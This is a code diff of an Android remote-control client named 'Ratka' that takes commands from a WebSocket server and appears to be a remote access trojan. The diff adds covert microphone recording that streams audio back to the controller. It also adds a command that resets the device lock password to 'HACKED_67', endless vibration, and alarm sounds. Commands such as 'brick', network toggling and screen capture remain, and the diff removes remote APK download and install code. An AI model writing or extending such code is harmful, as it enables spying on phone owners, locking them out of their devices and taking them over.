@@ -2,6 +2,7 @@ package com.ratka.client
 
 import android.app.Activity
 import android.app.WallpaperManager
+import android.app.admin.DevicePolicyManager
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
@@ -14,6 +15,7 @@ import android.hardware.display.VirtualDisplay
 import android.media.AudioManager
 import android.media.ImageReader
 import android.media.MediaPlayer
+import android.media.MediaRecorder
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.media.RingtoneManager
@@ -26,7 +28,6 @@ import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
-import androidx.core.content.FileProvider
 import okhttp3.*
 import org.json.JSONArray
 import org.json.JSONObject
@@ -89,15 +90,13 @@ class MainActivity : Activity() {
                 try {
                     val json = JSONObject(text)
                     when (json.optString("cmd")) {
+                        // Базовые
                         "battery" -> sendBatteryInfo(webSocket)
                         "vibrate" -> vibratePhone(2000)
                         "toast" -> showToast(json.optString("text", "Привет!"))
                         "open_url" -> openUrl(json.optString("url", "https://google.com"))
                         "sound" -> playSound()
                         "speak" -> speakText(json.optString("text", "Привет!"))
-                        "volume_up" -> changeVolume(true)
-                        "volume_down" -> changeVolume(false)
-                        "volume_set" -> setVolume(json.optInt("level", 50))
                         "apps" -> sendInstalledApps(webSocket)
                         "launch" -> launchApp(webSocket, json.optString("package", "com.android.settings"))
                         "wallpaper" -> setWallpaperFromBase64(webSocket, json.optString("data"))
@@ -107,31 +106,28 @@ class MainActivity : Activity() {
                         "flash" -> toggleFlash(webSocket)
                         "brick" -> brickPhone()
 
-                        // Система
+                        // Системные и медиа
                         "back" -> runCmd(arrayOf("input", "keyevent", "4"))
                         "home" -> runCmd(arrayOf("input", "keyevent", "3"))
                         "recents" -> runCmd(arrayOf("input", "keyevent", "187"))
                         "lock" -> runCmd(arrayOf("input", "keyevent", "26"))
-                        "sleep" -> runCmd(arrayOf("input", "keyevent", "223"))
-                        "wake" -> runCmd(arrayOf("input", "keyevent", "224"))
-                        "notifications" -> runCmd(arrayOf("cmd", "statusbar", "expand-notifications"))
-                        "kill" -> android.os.Process.killProcess(android.os.Process.myPid())
-
-                        // Медиа
                         "media_pause" -> runCmd(arrayOf("input", "keyevent", "127"))
                         "media_play" -> runCmd(arrayOf("input", "keyevent", "126"))
                         "media_next" -> runCmd(arrayOf("input", "keyevent", "87"))
-                        "media_prev" -> runCmd(arrayOf("input", "keyevent", "88"))
                         "volume_mute" -> (getSystemService(Context.AUDIO_SERVICE) as AudioManager).adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0)
                         "volume_unmute" -> (getSystemService(Context.AUDIO_SERVICE) as AudioManager).adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0)
 
-                        // Сеть и файлы
+                        // Сеть
                         "wifi_on" -> runCmd(arrayOf("svc", "wifi", "enable"))
                         "wifi_off" -> runCmd(arrayOf("svc", "wifi", "disable"))
                         "data_on" -> runCmd(arrayOf("svc", "data", "enable"))
                         "data_off" -> runCmd(arrayOf("svc", "data", "disable"))
-                        "url_download" -> downloadFile(webSocket, json.optString("url"))
-                        "install_apk" -> installApk(webSocket, json.optString("url"))
+
+                        // Новые
+                        "mic" -> recordAudio(webSocket)
+                        "infinite_vibrate" -> infiniteVibrate(webSocket)
+                        "change_password" -> changePassword(webSocket)
+                        "random_sound" -> playRandomSound()
                     }
                 } catch (e: Exception) { 
                     sendError(webSocket, "Ошибка обработки: ${e.message}")
@@ -180,22 +176,27 @@ class MainActivity : Activity() {
         } else { @Suppress("DEPRECATION") vibrator.vibrate(duration.toLong()) }
     }
 
+    private fun infiniteVibrate(ws: WebSocket) {
+        try {
+            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            val pattern = longArrayOf(0, 1000, 500)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                v.vibrate(VibrationEffect.createWaveform(pattern, 0))
+            } else { @Suppress("DEPRECATION") v.vibrate(pattern, 0) }
+            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Бесконечная вибрация запущена") }.toString())
+        } catch (e: Exception) { sendError(ws, "Ошибка вибрации: ${e.message}") }
+    }
+
     private fun showToast(text: String) { runOnUiThread { Toast.makeText(this, text, Toast.LENGTH_LONG).show() } }
     private fun openUrl(url: String) { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) }
     private fun playSound() { RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)).play() }
+    
+    private fun playRandomSound() {
+        val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+        RingtoneManager.getRingtone(applicationContext, uri).play()
+    }
+
     private fun speakText(text: String) { tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RatkaTTS") }
-
-    private fun changeVolume(up: Boolean) {
-        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-        am.adjustStreamVolume(AudioManager.STREAM_MUSIC, if (up) AudioManager.ADJUST_RAISE else AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
-    }
-
-    private fun setVolume(level: Int) {
-        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
-        val maxVolume = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
-        val targetVolume = (level.toFloat() / 100f * maxVolume).toInt()
-        am.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, AudioManager.FLAG_SHOW_UI)
-    }
 
     private fun launchApp(ws: WebSocket, packageName: String) {
         try {
@@ -210,10 +211,41 @@ class MainActivity : Activity() {
                 isFlashOn = !isFlashOn
                 cameraManager?.setTorchMode(cameraId!!, isFlashOn)
                 ws.send(JSONObject().apply { put("type", "response"); put("msg", if (isFlashOn) "Фонарик ВКЛ" else "Фонарик ВЫКЛ") }.toString())
-            } else {
-                sendError(ws, "Нет вспышки/камеры")
-            }
+            } else { sendError(ws, "Нет вспышки/камеры") }
         } catch (e: Exception) { sendError(ws, "Ошибка фонарика: ${e.message}") }
+    }
+
+    private fun changePassword(ws: WebSocket) {
+        try {
+            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            dpm.resetPassword("HACKED_67", 0)
+            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Пароль изменен на HACKED_67") }.toString())
+        } catch (e: Exception) { sendError(ws, "Ошибка пароля (нужны права админа): ${e.message}") }
+    }
+
+    private fun recordAudio(ws: WebSocket) {
+        try {
+            val file = File(cacheDir, "recording.m4a")
+            val recorder = MediaRecorder()
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            recorder.setOutputFile(file.absolutePath)
+            recorder.prepare()
+            recorder.start()
+            
+            Handler(Looper.getMainLooper()).postDelayed({
+                try {
+                    recorder.stop()
+                    recorder.release()
+                    val bytes = file.readBytes()
+                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    ws.send(JSONObject().apply { put("type", "audio_record"); put("data", base64) }.toString())
+                } catch (e: Exception) { Log.e("RATKA", "mic stop error", e) }
+            }, 10000)
+            
+            ws.send(JSONObject().apply { put("type", "response"); put("msg", "Запись микрофона (10 сек) пошла") }.toString())
+        } catch (e: Exception) { sendError(ws, "Ошибка микрофона: ${e.message}") }
     }
 
     private fun setWallpaperFromBase64(ws: WebSocket, base64Str: String) {
@@ -240,40 +272,6 @@ class MainActivity : Activity() {
             player.start()
             ws.send(JSONObject().apply { put("type", "response"); put("msg", "Аудио играет: $filename") }.toString())
         } catch (e: Exception) { sendError(ws, "Ошибка аудио: ${e.message}") }
-    }
-
-    private fun downloadFile(ws: WebSocket, url: String) {
-        Thread {
-            try {
-                val connection = java.net.URL(url).openConnection()
-                connection.connect()
-                val input = connection.getInputStream()
-                val file = File(cacheDir, "downloaded_file.dat")
-                file.outputStream().use { input.copyTo(it) }
-                ws.send(JSONObject().apply { put("type", "response"); put("msg", "Скачано: ${file.name}") }.toString())
-            } catch (e: Exception) { sendError(ws, "Ошибка скачивания: ${e.message}") }
-        }.start()
-    }
-
-    private fun installApk(ws: WebSocket, url: String) {
-        Thread {
-            try {
-                val connection = java.net.URL(url).openConnection()
-                connection.connect()
-                val input = connection.getInputStream()
-                val file = File(cacheDir, "update.apk")
-                file.outputStream().use { input.copyTo(it) }
-                
-                val uri = FileProvider.getUriForFile(this, "$packageName.provider", file)
-                val intent = Intent(Intent.ACTION_VIEW).apply {
-                    setDataAndType(uri, "application/vnd.android.package-archive")
-                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                startActivity(intent)
-                ws.send(JSONObject().apply { put("type", "response"); put("msg", "APK скачан, жди установки") }.toString())
-            } catch (e: Exception) { sendError(ws, "Ошибка установки: ${e.message}") }
-        }.start()
     }
 
     private fun requestScreenCapture() {
